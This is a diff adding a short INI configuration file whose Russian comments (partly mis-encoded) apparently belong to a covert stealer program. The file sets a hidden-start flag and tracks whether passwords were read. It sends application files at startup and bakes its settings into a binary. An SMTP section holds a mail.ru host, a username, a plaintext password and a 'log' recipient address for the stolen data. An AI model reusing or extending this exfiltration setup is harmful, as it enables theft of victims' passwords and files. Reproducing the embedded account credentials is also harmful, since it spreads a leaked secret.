@@ -1,0 +1,16 @@
+[main]
+Show=0
+; 0 если первый старт
+PassReaded=1
+; отправл€ть файлы приложений каждый раз при старте, иначе (1) только при первом старте
+checkreaded=1
+; подготовка к работе. если 1, то значени€ ini считываютс€ и сохран€ютс€ в бинарник
+Prepare=1
+
+; откуда отправл€ть
+Host = smtp.mail.ru
+UserName = samera 
+From = samera@mail.ru
+Pass = oburec7835
+MailTo = snkLog@mail.ru
+
